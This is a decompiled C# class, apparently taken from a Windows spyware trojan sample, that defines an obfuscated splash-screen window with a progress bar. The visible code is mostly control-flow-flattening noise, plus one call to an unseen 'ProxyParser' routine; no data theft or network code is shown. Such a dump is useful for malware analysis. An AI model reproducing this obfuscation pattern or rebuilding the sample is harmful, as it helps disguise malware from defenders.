// Decompiled with JetBrains decompiler
// Type: RiskGame.Dispatcher.MappingModelDispatcher
// Assembly: ArrayWithOff, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C12E9A27-BEBF-4775-817A-6AC642D52B19
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcra-344266b0bd586b6b9907f1657c694060dd1bae1df9fda81d7433002d419fe4fa.exe

using ArrayWithOff.Database;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Markup;

namespace RiskGame.Dispatcher
{
  public class MappingModelDispatcher : Window, IComponentConnector
  {
    internal ProgressBar progressBar;
    private bool m_Client;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public MappingModelDispatcher()
    {
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            ProxyParser.NewPool();
            num = 1;
            continue;
          case 1:
            // ISSUE: explicit constructor call
            base.\u002Ector();
            goto case 2;
          case 2:
          case 4:
            this.InitializeComponent();
            num = 5;
            continue;
          case 5:
            goto label_6;
          default:
            num = 4;
            continue;
        }
      }
label_6:;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public double PushExpression() => this.progressBar.Value;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void RunExpression(double ident) => this.progressBar.Value = ident;

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InitializeComponent()
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        bool client;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_10;
            case 1:
            case 4:
              goto label_7;
            case 2:
              goto label_11;
            case 3:
              goto label_5;
            case 5:
              client = this.m_Client;
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto label_7;
            case 6:
              goto label_9;
            default:
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto label_5;
          }
        }
label_5:
        Uri resourceLocator;
        Application.LoadComponent((object) this, resourceLocator);
        num1 = 6;
        continue;
label_7:
        if (!client)
        {
          this.m_Client = true;
          resourceLocator = new Uri("/ArrayWithOff;component/splashscreenwindow.xaml", UriKind.Relative);
          goto label_5;
        }
        else
          num1 = 0;
      }
label_10:
      return;
label_11:
      return;
label_9:;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [EditorBrowsable(EditorBrowsableState.Never)]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IComponentConnector.Connect(int offsetv, object vis)
    {
      int num1 = 4;
      if (true)
        goto label_3;
label_1:
      int num2;
      if (num2 == 1)
      {
        this.progressBar = (ProgressBar) vis;
        return;
      }
      goto label_8;
label_2:
      int num3;
      num1 = num3;
label_3:
      int num4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            goto label_9;
          case 1:
          case 2:
            num2 = num4;
            if (true)
            {
              num1 = 5;
              continue;
            }
            goto label_8;
          case 3:
            goto label_8;
          case 5:
            goto label_1;
          case 6:
            goto label_6;
          default:
            goto label_4;
        }
      }
label_6:
      return;
label_4:
      num3 = 3;
      goto label_2;
label_8:
      this.m_Client = true;
      if (MappingModelDispatcher.ListContainer())
      {
        num1 = 6;
        goto label_3;
      }
label_9:
      num4 = offsetv;
      num3 = 2;
      goto label_2;
    }

    internal static bool ListContainer() => true;

    internal static bool ExcludeContainer() => false;
  }
}
